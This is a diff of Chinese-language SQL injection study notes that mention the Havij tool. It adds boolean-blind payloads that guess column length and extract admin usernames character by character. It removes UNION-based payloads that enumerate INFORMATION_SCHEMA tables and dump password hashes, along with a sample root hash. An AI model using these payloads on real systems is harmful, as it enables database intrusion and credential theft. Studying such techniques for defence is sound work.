@@ -18,25 +18,16 @@ Havij
 ----------
 
 
-> and exists(select password from admin)  
-> // 说明存在passwordand
-> 
+and (select length(username) from admin limit 1)>0 
+ //猜解数据库列名长度：修改后面的>0是猜解长度 
 
 
 ----------
 
-
->  (select top 1 len(admin) from admin)>1 
->  // 猜测第一条记录的第一位ascii码为a
-
+and (select top 1 ascii(substring(username 1,1)) from admin)>0 
+//猜解内容：猜解出的内容需对应ASCII表,ascii、substring为MySQL的函数，MsSQL略有不同
 
 ----------
-
-
-> --’
-
-注释后面的语句
-
 
 ----------
 
@@ -49,41 +40,6 @@ Havij
 
 
 ----------
-
-
-> 'union select 1,table_name from INFORMATION_SCHEMA.tables -- ’
-通过查询系统表，可以看到MYSQL数据库中每一个表的名字以及每一列的名字等，
-
-
-----------
-
-
->    'union select 1,column_name from INFORMATION_SCHEMA.columns where table_name='users' --'
-> 
-> 列出users表：
-
-
-----------
-
->  ' union select null, password from users --'
-> 
-> 
->  password列：
-
-  
-
-
-----------
-
-> ' union select password, concat(host,0x7c,user,0x7c,password)
-> from users --' 
-> 用concat()函数将所有信息都列出来：
-
-localhost|root|*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
-> `concat()`函数把多个需要查询的字段放在一起
-> `0x7c`是`|`符号的16进制转码结果，有利于我们到时候把字段区分开。
-----------
-
 
 > version(),database(),user() //版本，数据库名称，用户名
 
